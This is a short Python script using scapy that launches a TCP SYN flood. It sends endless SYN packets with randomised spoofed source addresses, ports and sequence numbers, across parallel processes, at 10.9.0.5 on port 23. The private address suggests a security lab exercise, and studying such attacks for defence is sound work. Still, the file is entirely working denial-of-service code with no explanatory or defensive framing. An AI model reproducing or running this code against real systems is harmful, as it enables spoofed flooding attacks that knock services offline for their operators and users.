#!/usr/bin/python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
from multiprocessing import Process
import sys

def create_processes(target_num, ip_port):
    processes = []
    print("The target number of processes is %d" % target_num)
    for i in range(target_num):
        p = Process(target=syn_flood, args=(ip_port[0], ip_port[1]))
        processes.append(p)
        print("Starting %d Prcoess" % (i+1))
        p.start()
    for p in processes:
        p.join()

def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='S')
    # Start Attack
    while True:
        ip.src = str(IPv4Address(getrandbits(32)))
        tcp.sport = getrandbits(16)
        tcp.seq = getrandbits(32)
        packet = ip/tcp
        send(packet, verbose=0)


if __name__ == "__main__":
    target_ip = "10.9.0.5"
    target_port = 23
    target_parallel_num = int(sys.argv[1])
    #syn_flood(target_ip=target_ip, target_port=target_port)
    create_processes(target_num=target_parallel_num, ip_port=[target_ip, target_port])
